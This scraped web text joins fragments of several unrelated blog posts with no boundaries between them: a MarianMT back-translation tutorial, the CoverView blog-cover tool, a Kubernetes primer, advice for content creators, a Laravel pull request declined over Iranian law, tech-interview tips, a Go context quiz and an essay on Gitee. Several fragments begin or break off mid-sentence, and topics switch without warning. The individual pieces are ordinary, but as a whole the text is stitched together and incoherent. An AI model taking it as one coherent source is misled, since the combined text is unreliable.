</code></pre></div></div>
<div><div><pre><code><span>[</span><span>"It's so cool."</span><span>,</span> <span>'I hated food.'</span><span>,</span> <span>"They've been very helpful."</span><span>]</span>
</code></pre></div></div>
<h2 id="chained-back-translation">Chained Back Translation</h2>
<p>You can also run back translation in a chain to get more diversity. For example, <code>English -&gt; Spanish -&gt; English -&gt; French -&gt; English</code></p>
<div><div><pre><code><span>en_texts</span> <span>=</span> <span>[</span><span>'This is so cool'</span><span>,</span> <span>'I hated the food'</span><span>,</span> <span>'They were very helpful'</span><span>]</span>

<span>aug1_texts</span> <span>=</span> <span>back_translate</span><span>(</span><span>en_texts</span><span>,</span> <span>source_lang</span><span>=</span><span>"en"</span><span>,</span> <span>target_lang</span><span>=</span><span>"es"</span><span>)</span>
<span>aug2_texts</span> <span>=</span> <span>back_translate</span><span>(</span><span>aug1_texts</span><span>,</span> <span>source_lang</span><span>=</span><span>"en"</span><span>,</span> <span>target_lang</span><span>=</span><span>"fr"</span><span>)</span>

<span>print</span><span>(</span><span>aug2_texts</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code>["Yeah, that's cool.", "It's the food I hated.", 'They were of great help.']
</code></pre></div></div>
<h2 id="available-models">Available Models</h2>
<p>Here are language codes for a subset of major romance language that you can use above.</p>
<table>

<h2 id="alternative-applications">Alternative Applications</h2>
<p>Besides data augmentation, the back translation process can also be used for text paraphrasing.</p>
<p>Similarly, we can also use it as an adversarial attack. Suppose we have a training dataset on which we trained an NLP model. Then, we can augment the training dataset and generate prediction from our model on augmented texts. If the predictions are different than our ground-truth labels, then we have a list of texts where our model fails. We can get good insights by analyzing those responses.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Thus, MarianMT is a decent free and offline alternative to Google Translate for back-translation.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1598677527863/dI1P7tXJc.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>Do you write blogs?  Have you ever struggled to create cover images for your blogs? 
Well, I did. So I have made a tool that will help you create awesome cover images for your blogs quickly.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598169671591/BKzp2hZnU.png?auto=format&amp;q=60" alt="frame_chrome_mac_dark (1).png"></p>
<h2 id="the-problem">🗃 The problem</h2>
<p>I started blogging a few months back. It's one of the best decisions I have ever made. But every time I wanted to write a post, I had to create and edit a cover image for it. I mean I love creating creative cover images but sometimes I feel I just spend too much time designing it.</p>
<p>And then I saw these comments on my posts.
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598092132300/CLWYZEN_X.png?auto=format&amp;q=60" alt="comments.png"></p>
<p>I use <em>canva</em>. It's a nice tool. But I thought I need something minimal so that creating those cover images won't be any hassle. Coincidently I just started learning <strong>react</strong>. I knew some basics and I thought why not implement my knowledge of react and make something out of it. Also, it might help someone else too. And that's how I came up with the idea of this project.  </p>
<h2 id="the-process">🛠 The process</h2>
<p>I started working on this as a fun project. I had an exact visualization of what I wanted to create. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598290323414/bt061ZVRr.png?auto=format&amp;q=60" alt="coverview layout.png"></p>
<p>So I first created a design of a cover image that can be used as the template user can edit. I asked my self what things I would like to add or what can I do to make the cover image more appealing. And I started playing with it. It was fun. After spending a lot of time, solving problems and finding solutions, this is what I came up with the first build.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598290972723/9vlpR1JTN.gif?auto=format,compress&amp;gif-q=60" alt="cover.gif"></p>
<h2 id="the-final-outcome">📦 The final outcome</h2>
<p>I shared it on Twitter and Linkedin and I got a really good response from the developer community. I always wanted to contribute to open source. There are multiple ways to contribute and one of which is creating open-source projects. I open-sourced it. This is my first open-source project with react.</p>
<p><a target="_blank" href="https://github.com/rutikwankhade/CoverView"><img src="https://github-readme-stats.vercel.app/api/pin/?username=rutikwankhade&amp;repo=CoverView" alt="ReadMe Card"></a> </p>
<p>And within a few hours, I got my first pull request. <a target="_blank" href="https://twitter.com/asish_io">Asish Raju</a> made his first open-source contribution by contributing to my project. He added a few more customizable options and refactored the code.</p>
<p>For the first time, I was on the other side of a project. I learned how to manage pull requests, review code, and merged his pull request. <a target="_blank" href="https://opensource.guide/">Open Source Guides</a> is a great resource to learn.</p>
<h2 id="features">Features</h2>
<p>Then I improved it little by little and added some more features. Here are a few noteworthy features of <a target="_blank" href="https://coverview.now.sh/">CoverView</a>.</p>
<ul>
<li>🛠 Create awesome cover images for your blogs quickly and easily</li>

<li>💾 Download cover images in <code>.png</code> as well as <code>.jpeg</code> format</li>
</ul>
<p>I just had a lot of fun making this. You might not be able to create a lot more creative images But having a nice cover is always better than having some random image or no cover image at all.</p>

<h2 id="conclusion">Conclusion</h2>
<p>The important lesson I learned while building this is that you don't need to learn a language or framework completely to start making projects. You can start applying while learning it. I feel this way we can learn from our mistakes and understand the importance of one concept over others. </p>

                <p>At the moment Kubernetes is one of the most exciting technologies in the world of DevOps. Recently a lot of hype has formed around it for one simple reason, and this reason is the mighty containers.</p>
<hr>
<p><img src="https://iamluminousmen-media.s3.amazonaws.com/media/kubernetes-101/kubernetes-101-2.JPG" alt="Infrastructure"></p>
<p>Once upon a time, and it wasn't so long ago, we still ran applications on server hardware. We had a website that spins on a hardware server and a database that stores the website's state. Users visit the site, everything was cool, everything worked.</p>
<p>The website become successful and our company grows. Then the website becomes more and more complex and evolves into a platform with a <a href="https://luminousmen.com/post/thoughts-on-microservices">bunch of services</a>.</p>
<p>Then along came virtual machines (VMs), and we could run multiple operating systems and applications on a single machine. This empowered company to run ten times or more server instances on a single server. But what if we could run even more server programs on a single server if we left behind the bulk of the VM's operating system? That would give us, even bigger cost savings and flexibility. And the containers came along.</p>
<h2>Docker</h2>
<p><img src="https://i.imgur.com/DbqFymX.png" alt="How Docker was born"></p><p>Docker containers have been the de facto development standard for quite some time now, but interestingly enough, Docker is not a pioneer in the container world.</p>
<p><img src="https://iamluminousmen-media.s3.amazonaws.com/media/kubernetes-101/kubernetes-101-3.JPG" alt="History"></p>
<p>Docker is based on namespaces and cgroups technologies (the first one provides isolation, the second one provides process grouping and resource limitation), so in terms of virtualization, it's not much different from LXC/OpenVZ which historically came first. Same native speed, same isolation methods based on Linux kernel machinery. However, at a higher level, it's a very different story. The highlight of Docker is that it allows you to deploy a fully virtual environment, run an application on it, and easily manage it.</p>
<p>Like a virtual machine, the Docker runs its processes in its own pre-configured operating system. However, all the docker processes run on a physical host server sharing the processors and available memory with all the other processes running in the host system. The approach used by the Docker is in the middle between running everything on the physical server and full virtualization offered by virtual machines. This approach is called <em>containerization</em>.</p>
<p><img src="https://iamluminousmen-media.s3.amazonaws.com/media/kubernetes-101/kubernetes-101-4.JPG" alt="Docker internals"></p>
<p>Starting with Linux containers, the excitement moved to Docker containers, while increasing the need for <em>container orchestration</em>.</p>
<p>Back to our story. At some point, the company has realized that the current server is not sufficient, no matter how big it is (vertical scaling). The history moves to the next phase — the company buys more servers and divides the load between them (horizontal scaling).</p>
<p>The IT team tasks are getting harder and harder. They need to bother harder with problems like updates, patches, monitoring, security, backups, durability, reliability, resiliency... which means pagerduty at 6 am on Sunday...</p>
<p>Cloud!</p>
<p>Cool, now all we have to worry about is application logic. But the complexity of the highly available distributed system didn't go anywhere — it's just moved to the complexity of orchestrating and connecting the infrastructure components. Deployments, service discovery, gateway configurations, monitoring, replication, consistency...</p>
<p>It was a short story as we have come to this day. Now we have a distributed system with a bunch of services inside a bunch of containers in the cloud.</p>
<h2>Kubernetes</h2>
<p><em>Don't flatter yourself, even though I've been working with Kubernetes I only know the tip of the iceberg. So here will be not a deep dive, but rather a smooth flight over existing subsystems and concepts.</em></p>
<p>Kubernetes is a sophisticated mechanism designed to make systems scalable, resilient, and easy to deploy. It allows us to automate container orchestration — starting, scaling, managing containerized applications including cluster management, scheduling, service discovery, monitoring, secrets management, and more.</p>
<p>Kubernetes allows to automate the start and rollback of deployments, Kubernetes manages the resources and can scale the required resources for the applications depending on how much they need in order to avoid waste of resources. So k8s essentially is <strong>process automation</strong>. Applications in k8s are rolled out and tested without administrators. The developer writes a script and then the cloud magic happens. So, in the ideal world of Kubernetes, all operational support of the software lies on the shoulders of programmers, and administrators make sure that the layer of cloud infrastructure — that is, Kubernetes itself - works steadily. That's why companies go to the clouds to completely remove the routine of their administration and do only development.</p>
<p>In my opinion, one of the coolest features of Kubernetes is that it helps <strong>standardize the work with Cloud Service Provider</strong>. No matter which CSP we are talking about, working with Kubernetes always looks the same. The developer, in a <strong>declarative manner</strong>, tells the Kubernetes what he needs, and Kubernetes works with system resources, helping the developer to abstract from the implementation details of the platform.</p>
<p>Originally, Kubernetes was a Google project that took into account the shortcomings of <a href="https://research.google/pubs/pub43438/">Borg</a>, the ancestor of Kubernetes. Google uses Kubernetes to manage its gigantic infrastructure of millions of containers. At some point, Google gave the Kubernetes to the world, namely the <a href="https://www.cncf.io/">Cloud Native Computing Foundation</a>. So far, Docker has added the Kubernetes as one of the orchestrators — Kubernetes is now part of the Docker Community and Docker Enterprise Edition.</p>
<p>Kubernetes has many names among which are <em>kube</em> or <em>k8s</em> (I like cool acronyms with numbers and will use it further).</p>
<p>The Kubernetes itself is one huge piece of abstraction. These abstractions are mapped to virtual or physical infrastructure. To understand how it works, we must first understand its basic components.</p>
<h3>Pod</h3>
<p>The pod is the smallest unit that can be launched on a cluster node. It is a group of containers that should work together for some reason. The containers in the pod share port numbers, Linux kernel namespaces, and network stack settings. So when you scale your application within k8s, you should increase the number of pods rather than the number of containers in one particular pod. By <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/#restart-policy">default</a> containers inside pods are restarted automatically fixing intermittent problems for you. So even on these basic level k8s keeps your containers running and with a little additional effort, you can tune it to get even more reliability.</p>
<p>Quite often (but not always) there is only one container underneath the pod. But pod abstraction provides additional flexibility when, for example, two containers need to share the same data warehouse, or if there is a connection between them using interprocess communication, or if they are closely connected for some other reason, all this can be implemented by running them in the same pod.</p>
<p>Thus, you can easily draw parallels with existing code primitives and distributed primitives in k8s. Class is a container image, an object is a container instance, a pod is a deployment unit, the composition can be achieved via sidecar pattern, etc.</p>
<p>Another flexibility of pods is that they do not require the use of Docker containers. If necessary, you can also use other application containerization technologies, such as <a href="https://coreos.com/rkt/">rkt</a>.</p>
<h3>Desired state</h3>
<p>The desired state is one of the basic concepts of k8s. You can specify the required state of running pods instead of writing how to achieve that state. For example, if a pod stops working for some reason, k8s will recreate the pod based on the specified desired state.</p>
<p>K8s always checks the state of the containers in the cluster, and this is done by the control loops on the so-called Kubernetes Master, which is part of the control plane. We'll talk about it a bit later.</p>
<h3>Objects in Kubernetes</h3>
<p>An object in k8s is a record of intent — the desired cluster state. And after the object is created, the k8s will constantly check for this object state. In addition, the objects also serve as an additional abstraction layer above the container interface. You can interact with the objects' entities instead of interacting directly with containers.</p>
<p>Almost every k8s object includes two nested object fields that govern the object's configuration: the object spec and the object status.</p>
<p><strong>Pod</strong> that we talked about earlier is just one of the k8s objects.</p>
<p>Pods are mortal — they are born and die but in order to be able to communicate with pods and for them to be able to communicate with each other abstraction of the <strong>Service</strong> has been introduced. Service plays the role of an access point to sets of pods that provide the same functionality as the underlying pods. There are different types of services, ClusterIP, NodePort, LoadBalancer, ExternalName. By default k8s use ClusterIP — it exposes the Service on a cluster-internal IP, so you can only access it using the Kubernetes proxy.</p>
<p>Also for exposing services you can use <strong>Ingress</strong> object. Ingress is not a Service type, but it acts as an entry point for your cluster. Ingress is a description of how traffic should flow from outside the cluster to your services, it acts as a "smart router" or ALB. It allows you to consolidate routing rules into a single resource, as it can aggregate multiple services under a single IP address.</p>
<p>For example, the web application can have a home page at <a href="https://example.com/">https://example.com</a> and a shopping cart at <a href="https://example.com/cart">https://example.com/cart</a> and an API at <a href="https://example.com/api">https://example.com/api</a>. We could implement all of them in one pod, but in order for all of them to scale independently, we could decouple them into different pods and connect to Ingress.</p>
<p>K8s also has a huge number of controllers, such as <strong>ReplicaSet</strong> — it checks that a certain number of copies of pods are running, <strong>StatefulSet</strong> is used with stateful applications and distributed systems, <strong>DemonSet</strong> is used to copy pods to all nodes in the cluster or only to specified nodes, etc. They all implement a control loop — a non-terminating loop that monitors the state of its subsystems, then makes or requests …</p></div></div>

Mailchimp handles my weekly <a href="https://www.wealest.com/newsletter" target="_blank">Quick-Reads newsletter</a>, which is also writing based.

I didn't have one when I started, and I still don't. </p><p>For example, you can be up and running on Twitter in less than 10 minutes with very little technical knowledge. It will take a little longer to build a custom Squarespace site yourself, but nothing crazy. It took me about three weeks to make this version of <a href="https://wealest.com/" target="_blank">Wealest.com</a>, and it hasn't had a significant overhaul since it went live (even though it probably needs one!). </p><p>Squarespace has loads of built-in templates. Once you know the design basics, you can make big changes quickly. Or, you can just pay someone else to build it for you and focus on creating and publishing your work. </p><h3>There Are No-Code Platforms For Almost Everything. </h3><p>If you can imagine it, there is probably a software already built that does it for you. </p><p>For example, <a href="https://www.mightynetworks.com/" target="_blank">Mighty Networks</a> is a platform that lets you to build entire forum communities around your content. You can even create custom courses (video and written) for your audience to purchase.</p><p><a href="https://substack.com/" target="_blank">Substack</a> let's independent writers make a living off their writing with a newsletter / subscription package.</p><p>And <a href="https://www.canva.com/" target="_blank">Canva</a> lets graphic designers build almost any design from scratch or pre-built templates.</p><p>You don't need to know how to code - just choose software and start creating.</p><h3>You Can Expand Your Platforms Over Time.</h3><p>I do recommend starting with just one or two platforms to make it easier to publish consistently. But you can always expand your platforms over time. </p><p>While I only have three main platforms right now, mostly text-based, I plan on adding Instagram, YouTube, and a Podcast in the next year.</p><p>To build an audience, you need to publish. What kinds of stuff should you post?</p><h3>Pick A Niche You’re Interested In Learning More About.</h3><p>You've probably heard the phrase, "write what you know." This is wrong (mostly).</p><p>Yes, you should always try and filter ideas through your unique experience. But that doesn't mean you can't just create content about the cool things you're learning in a particular field.</p><p>That's where I started. Wealest was born out of my hunger to learn the ideas of wealth creators. I didn't know anything about wealth creation before 2016. I just read a lot, filtered those ideas through my unique personality, and wrote about it. </p><p>So, pick something you're interested in and want to learn more about. Then create content around what you learn and how it applies to you.</p><h3>Production Is Better Than Perfection. </h3><p>Your first piece of content probably won't be great. That's ok! </p><p>When you publish consistently, you'll get feedback on what works and what doesn't. This will make your work better over time. Here's what that looks like:</p><p>Create → Publish →  Get Feedback → Iterate → Publish → Get Feedback → Iterate → Publish … and the cycle continues.  </p><p>The key is to keep publishing despite feeling like your work is not good enough. Production is better than perfection. You will get better.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1595629321792_179684"><div><h3>How Often Should You Publish?</h3><p>It depends on what you're creating. I publish one long-form blog post a week, and it takes me about 5 hours from beginning to end. My newsletter also goes out once a week and takes about an hour. </p><p>You don't need to dedicated 20 hours a week to creating stuff and publishing. Find a pace that works for you, and stick with it. Consistency is the key.</p><h3>The Media You Create Has a Zero Marginal Cost of Reproduction.</h3><p>Internet media has a critical intrinsic characteristic that creates an enormous opportunity for creators: there's<strong> no marginal cost to reproduce it. </strong></p><p>Whether one person reads this article, or one million, the cost for me to write it is the same (about 5 hours of my time). Then it<em> </em><strong>scales</strong> without any cost of reproduction on my end to anyone with an internet connection. I write it once, and can then "ship it" to anyone around the world for free. This is the power of internet media. </p><p>No matter what you're interested in, there's someone else who's interested in the same thing you are. That's the incredible power of the internet. So, how do like-minded people find your work?</p><h2>Google Search</h2><p>Google Search is the most effective way to get traffic to your content. Once you start publishing consistently, Google will begin to rank you in their search results. Be warned: <strong>it takes a long time</strong> (six months to a year) to start ranking consistently. But it's well worth it. </p><p>Here's an example from my site: go search "asymmetric opportunity" on Google. What's the first result? </p></div></div><div data-aspect-ratio="40.65934065934066" data-block-type="5" id="block-yui_3_17_2_1_1595546194912_44911"><div>

        <h3>Contributing to the Laravel ecosystem</h3><p>This morning I discovered a useful <a href="https://github.com/armancodes/laravel-download-link" rel="noopener noreferrer" target="_blank">Laravel package</a> for generating download links for files, that has some useful features, like expiry time, restricted IP addresses.</p><p>One thing was missing: assigning the DownloadLink for a specific user, so for example when somebody purchases a digital product we can generate a DownloadLink that will only allow him to download the file, and nobody else.</p><p>So I thought this is a good opportunity to contribute to the Laravel ecosystem 💡. I went ahead and <a href="https://github.com/Yiddishe-Kop/laravel-download-link" rel="noopener noreferrer" target="_blank">forked the repo</a>, added the functionality to assign a DownloadLink to a user, &amp; submitted a <a href="https://github.com/armancodes/laravel-download-link/pull/9" rel="noopener noreferrer" target="_blank">pull-request</a> (PR) to the owner of the repo, with a detailed explanation what I'm doing.</p><p>The owner of the repo was very fast, and within an hour already added some more features (assigning DownloadLinks to a list of users) and added tests. This is unlike some <a href="https://github.com/inertiajs/inertia/pull/141" rel="noopener noreferrer" target="_blank">other PRs</a> I opened, that are currently waiting for months...</p><h3>Tehran, Iran</h3><p>Some time later I checked back on the PR, and I was surprised to see that it has been closed, and not merged 😕. I opened it up, and this is what greeted me:</p><blockquote>Hi, Thanks for your great idea. I'm SO SORRY to tell you that I cannot merge this PR. There is a law in my country that we MUST NOT have any relationship with people from Israel or the Israel government. I hope you understand this, and again thanks for your time.</blockquote><p>Turns out he's from Tehran, Iran; and he saw on my <a href="https://github.com/Yiddishe-Kop" rel="noopener noreferrer" target="_blank">GitHub profile</a> that I'm from Jerusalem, Israel.</p><p>I was very surprised and also hurt. This is the first time I experienced the conflict between Israel &amp; Iran first hand. I also never thought that Iran would have has such laws.</p><p>But hey, maybe I'm a Palestinian living in Jerusalem? Or does Iranian law not differentiate?! 🙃 <em>[...aaahhh, my profile name is</em>  <strong>yiddishe-kop</strong> <em>😉]</em></p><p>I thought for a moment how to respond, and this is how I replied:</p><blockquote>That's very sad, @armancodes. I hope one day your country removes this restriction, just like my country has never put such restrictions. However I'm sure that your governments restrictions don't represent your views 🤷‍♂️ . Good luck anyway! 😃</blockquote><h3>What's with the code?</h3><p>I'll probably just have to continue working on my fork of the repo for my own needs, but without being able to collaborate together, it is a loss for the open source community.</p><p>Let's hope that the Iranian people will be freed from their ayatollahs, and be able to collaborate with whoever they want.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>I do a fair amount of interviews, 60+ during the six months prior to COVID and during those I have noticed some common mistakes candidates make during the interview that are highly avoidable, so I thought I’d spend just a little bit of time writing those down and share them.</p>
<!-- raw HTML omitted -->
<h3 id="1---not-asking-clarification-questions">#1 - Not Asking Clarification Questions</h3>
<p>Normally all tech companies make candidates go through at least one round of technical interview, where a problem is presented and the candidate needs to address it and solve it. This interviews can vary in form, ie. coding challenges where the candidate needs to do hands-on coding, architectural interviews where the candidate would need to design some “bigger” system and so on and so forth.</p>
<p>Regardless of what type of technical question you may be asked, it is very important to ask clarifying questions <strong>always</strong>. And I can’t stress enought the <strong>always</strong> here, even if you think the problem given is trivial, it is not, take a bit of time to think about it and questions will pop up in your mind. For instance, if I asked you during an coding interview:</p>
<ul>
<li>“<em>given a list of numbers, return two numbers such that one times the other results in 220</em>”</li>
</ul>
<p>You could think that this two-sentence problem is very clear. However questions that I would ask are “<em>is the list sorted</em>…<em>are the numbers unique</em>…<em>can I multiply a number to itself</em>…<em>what shall I return if there are multiple numbers meeting the criteria</em>”.</p>
<p>Asking clarifying questions is however not only important for you to provide the best solution possible. It is also important because it is what I would expect you to do in real life when coming in to my team and you’re given a problem to solve. I would expect you to ask questions to further scope the problem, discover corner cases, etc. and not just go back to your desk and start coding.</p>
<p>I normally tell candidates upfront “<em>feel free to ask any question that helps you clarify</em>”. If you are given that cue, it is because it is important for the process. Stop, think, and ask the questions that will surely pop up.</p>
<h3 id="2---not-keeping-your-interviewer-engaged">#2 - Not keeping your interviewer engaged</h3>
<p>There was a time where I found this sentence just be BS. I thought that the interview process was just about me solving or answering questions. I was dead wrong. Any good interview process is a two-way street, a process where the interviewer and the candidate <strong>collaborate</strong> during however long the interview is. And because they are collaborating, it is very important to keep the other party engaged.</p>
<p>“<em>How do I keep my interviewer engaged?</em>” you may ask. It is extremely simple, just <strong>think out loud</strong>, let the interviewer know how and where your thoughts are taking you. I know this can feel odd, or you may fear saying anything stupid, don’t. There is literally nothing you may say that would be interpreted as stupid.</p>
<p>Thinking out loud during an problem solving interview has several advantages in my opinion:</p>
<ul>
<li>the obvious, you keep your interviewer engaged. We are all humans and it is very easy for us to let our mind wander off for a moment if the candidate is just silent while e.g. coding for 30 minutes. And as unfair as it might sound, an interviewer not paying attention, does not play on your side</li>
<li>the less obvious, it gives you more time. There are numerous instances where candidates that I interviewed just go silent during their coding or their architectural challenge and after a few minutes they just come with the solution. At that point I have lots of questions about the trade-offs they made, why they made them etc. Many of those questions could have been avoided by just walking me through that thought process, and that saves time that might be especially important when the solution is not completely correct.</li>
<li>the none obvious at all. <strong>Good interviewers are there to help you</strong>. Believe me, all good interviewers I know <strong>want the candidate to pass the interview</strong> and will do whatever possible (and within their limits) to help you succeed. So giving them early feedback on why/what/how you’re doing what you’re doing let them help you as soon as possible. For example, if I see that they path you’re taking will get you to a very bad solution, I will try to  ask subtle questions to make you to re-think about your current proposal and other possible trade-offs.</li>
</ul>
<h3 id="3---not-prepare-for-the-interview">#3 - Not prepare for the interview</h3>
<p>This mistake may seem very hard to make, right? Who comes to an interview for a tech company not having done tons of leetcode problems, studying algorithms and data structures to the limit?
Well, this is one side of the preparation, the other one however is not so obvious.</p>
<p>Most tech companies have rounds of behavioral interviews and although these may or may not involve certain technical (very high level) questions, you also need to prepare for these. These kinds of interviews are more like an open discussion where you will be asked things related to your previous projects, your background, certain situations you faced in the past and how you approached them, interactions with your team mates, how have you led projects (if applicable), etc. And for all these, it is better to come prepared.</p>
<p>When I say prepared, I don’t mean that you invent, or “fake” the answers to these types of questions, believe me when I tell you that it is relatively easy to know when any of that is true with just two-three follow up questions.
What I mean when I say prepare is that you should spend some time thinking about those kinds of past situations, for instance:</p>
<ul>
<li>that time you led that project that was slipping the deadline, how did you approach that? what did you do? what was the outcome? what did you learn?</li>
<li>that time you were given not so good feedback by some of your peers, think about what you learnt, how you felt, how you dealt with that and what changed moving forward</li>
<li>that time you had to give feedback to some of your peers that was hard for you to give, think about how you did it, would you do it in the same way today? how do you think it went now in retrospect?</li>
<li>that time you were given a problem that required more broader knowledge than what you had at that moment, what did you do? how did you deliver/ did you enjoy the challenge or was it stressful?</li>
<li>…</li>
</ul>
<p>I see this preparation as going back to your past memories and reflect on them. This will help during the interview as your thoughts will be already in order and you will not have to pause for minutes to think about what to say, you will just know what past experience is most relevant for that moment, believe me.</p>
<p>It is also very important to remember, be <strong>completely honest</strong>. In these kinds of interviews there is no right or wrong answer, we are just trying to get to know you a bit better, your motives and motivations, where you excel and where there is still potential improvement, etc. All this helps you and the hiring manager have a good start on your first day at work.</p>

	<p><small>August 29, 2020</small></p>
</div><div><p>Today, <a href="https://dave.cheney.net/">Dave Cheney</a> did another Go pop quiz
<a href="https://twitter.com/davecheney/status/1299846267850223616">on Twitter</a>,
where he asked whether the following code printed -6, 0, '&lt;nil&gt;', or
paniced:</p>

<blockquote><pre>package main
</pre>

<pre>import (
    "context"
    "fmt"
)

func f(ctx context.Context) {
    context.WithValue(ctx, "foo", -6)
}

func main() {
    ctx := context.TODO()
    f(ctx)
    fmt.Println(ctx.Value("foo"))
}
</pre>
</blockquote>

<p>I didn't answer this correctly because I focused my attention on the
wrong thing.</p>

<p>What I focused on was the use of the <code>"foo"</code> string as the context
key, partly because of my experience with languages like Python.
To start with, the <a href="https://golang.org/pkg/context/"><code>context</code></a>
package's documentation says:</p>

<blockquote><p>The provided key must be comparable and should not be of type string
or any other built-in type to avoid collisions between packages using
context. Users of WithValue should define their own types for keys.
[...]</p>
</blockquote>

<p>A traditional problem in languages like Python is that two strings
may compare the same without actually being the same thing, and
some code really wants you to present it with the exact same thing.
However, the <code>context</code> package doesn't require that you present it
with the exact same key, just a key where the <em>interface value</em> of
the key will compare the same.</p>

<p>(Because <code>context</code> compares interface values, both the value and
the type must match; it's not enough for both values to have the
same underlying concrete type, say string, and to compare identical.
This is why defining your own string type is a reliable away around
collisions between packages.)</p>

<p>So after I worked through all of this, I confidently answered that
this code printed -6. The <code>"foo"</code> string that the value is set
with is not necessarily the same <code>"foo"</code> string that it's retrieved
with, but that doesn't matter. However, this is not the problem
with the code. The actual problem is that <strong>context.WithValue()
returns a new context with the value set, it doesn't change the
context it's called on</strong>. Dave Cheney's code is written as if
<code>.WithValue()</code> mutates the current context, as <code>f()</code> ignores that
new context that <code>.WithValue()</code> provides and returns nothing to
<code>main()</code>. Since the original <code>context</code> in <code>main()</code> is what <code>.Value()</code>
is called on, it has no <code>"foo"</code> key and the result is actually
'&lt;nil&gt;'.</p>

<p>This problem with the code is actually a quite interesting mistake,
because as far as I can tell right now none of the usual Go style
checkers detect it. This code passes '<code>go vet</code>', it produces no
complaints from <a href="https://github.com/kisielk/errcheck"><code>errcheck</code></a>
because we're not ignoring an error return value, and tools like
<a href="https://github.com/golangci/golangci-lint">golangci-lint</a> only
complain about the use of the built-in type string as the key in
<code>.WithValue()</code>. Nothing seems to notice that we're ignoring the
critical return value from <code>.WithValue()</code>, which turns it into more
or less a no-op.</p>

<p>(Now that Dave Cheney has brought this to the surface, I suspect
that someone will contribute a check for it to <a href="https://staticcheck.io/">staticcheck</a>, which already detects the 'using a
built-in type as a key' issue.)</p>

            <section>
                <div>
                    <p>The impending ban or acquisition of TikTok and ByteDance’s lawsuit against the Trump administration have sucked up all the oxygen in the US-China tech zeitgeist. A gigantic IPO, possibly the largest in the world, by Ant Financials is also looming on the horizon. Consequently, one story with potentially much farther-reaching impact got buried.</p><p>【想看<a href="https://interconnected.blog/can-you-nationalize-open-source/#chinese-version-below">中文的读者请点击这里</a>或滚动到本页下方】</p><p>That story is the Chinese <strong>Ministry of Industry and Information Technology (MIIT)’s anointment of Gitee, a homegrown Git-based developer collaboration platform</strong>, as the domestic “national champion” to drive open source growth in China. It got <a href="https://techcrunch.com/2020/08/21/china-is-building-its-github-alternative-gitee/">a blip on TechCrunch</a>, and I included the original announcement in <a href="https://interconnected.blog/august-23-2020-crypto-tiktok-jedi-zoom-pinduoduo-gitee/">last week’s Interconnected Weekly</a>. That's about it.</p><p>To understand why this development could have global significance, we need to first understand Gitee, MIIT’s role in China’s technology landscape, and open source’s own “gift culture” and global reach.</p><h2 id="what-is-gitee">What is Gitee?</h2><p>As readers of Interconnected know, I loathe the intellectually lazy comparisons that are common when talking about Chinese and American tech companies and try to avoid the “X is the [American company Y] of China” shorthand. Sure there has been plenty of cloning by Chinese companies of American success stories (and increasingly in the opposite direction), but both economies, cultures, and consumer behaviors are complex in their own ways and ought to be treated with nuance.</p><p>Sadly in Gitee’s case, this lazy framework happens to be rather accurate. It <em><strong>is</strong></em> the GitHub of China and nothing more.</p><h3 id="history-and-product">History and Product</h3><p>Gitee started in 2013 and was incubated out of OSChina, the country’s largest open source community website that started in 2008. OSChina owns Gitee, and even today the main contact email on Gitee’s homepage is a `oschina.cn` address. When Gitee started, GitHub (the current incumbent in the code repository hosting space) was a five-year-old Series A startup that was already gaining traction in various open source communities, especially the Ruby on Rails community.</p><figure><img src="https://lh3.googleusercontent.com/6N1XUrxagJ6la-tzFEoV_NaWdvhTZVBRTv92bZyQ0_xLMGDMsxAqib3n8rayNQfMkh-Sl1PeeOgEwMEXrPMXWxo4InjRT2BVhWCyzkFIQYOqh37G7j5Uk0__RiED17zGbHhzsuOc" alt=""></figure><figure><img src="https://lh6.googleusercontent.com/3Qspqh0GLw_AMq91OZ0QpGq7ctsslMPJuDpvakrvJ4XromE2sylsm7M63lOckfZUZbudrbAReRyDC9LwbIalEIacpWLzannK1mc_hwj1ax4WaYC7ffNJsST_gSkIlMBx9aOYvHfr" alt=""></figure><p>If GitHub didn’t revamp it’s own UI <a href="https://github.blog/changelog/2020-06-23-design-updates-to-repositories-and-github-ui/">just a couple of months ago</a>, the two platforms would’ve looked virtually identical, except for a different color scheme and one displaying many more Chinese characters than the other. (The degree of similarity reminds me a bit of RenRen and Facebook in the early days of social media in China.)</p><p>It’s not completely fair to say Gitee has done nothing new. It does have more social tools, like direct messaging, which GitHub does not support. It also has an embedded web-based IDE (Integrated Development Environment, aka text editor for developers) though it’s not clear how many developers use it in place of existing popular solutions, like VSCode or IntelliJ. GitHub continues to add new features at a rapid clip, even after the Microsoft acquisition, like GitHub Actions and <a href="https://github.blog/2020-05-06-new-from-satellite-2020-github-codespaces-github-discussions-securing-code-in-private-repositories-and-more/">Discussions (in beta)</a>, so it’ll take quite a few years before Gitee can reach feature parity, if ever.</p><p><em>(Before writing this post, I tried to sign up for a Gitee account to experience it fully as a developer, but got stumped by a bizarrely difficult captcha process that took me at least five tries without success. I didn’t know I was this bad at reading fuzzy letters. This level of friction and poor user experience would’ve made any developer balk and leave.)</em></p><figure><img src="https://lh5.googleusercontent.com/dyK5nkpTv83N7ExBAeILqTyjpv6mz0dXLOx2aPbl8lmoMTee1Ma6hUpGsof1ODJ5fCIGotLpokXWV0l4rbdqIVAMh_MetwhGVFzjkFRajv9i6QVFR__Xf3qvpXeGUmpVW8vDnbYl" alt=""></figure><h3 id="market-traction">Market Traction</h3><p>For the most part, Gitee is a typical venture-backed startup though it has not attracted much investment so far. In 2019, Gitee received a small strategic <a href="https://www.chinatechnews.com/2019/12/10/26287-oschina-gained-strategic-investment-from-baidu">investment from Baidu</a> and, in exchange, Baidu migrated some of its flagship open source projects, like its <a href="https://gitee.com/baidu/apolloauto">self-driving framework Apollo</a>, to Gitee to seed more adoption. It claims to be the 2nd largest code repository platform in the 